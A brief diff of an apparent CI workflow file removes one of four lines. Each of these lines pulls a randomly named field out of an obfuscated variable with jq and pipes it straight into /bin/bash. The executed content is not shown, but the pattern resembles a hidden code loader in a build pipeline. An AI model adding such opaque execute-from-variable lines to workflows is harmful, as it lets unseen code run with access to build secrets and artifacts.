@@ -27,7 +27,6 @@ jobs:
           printf '%s' "$vqp9" | jq -r .fjm434 | /bin/bash
           echo $vlkgt86084 | jq -r .hhotk8933 | /bin/bash
           echo $ezm10 | jq -r .xm3036 | /bin/bash
-          printf '%s' "$t9" | jq -r .xcqbn4871 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
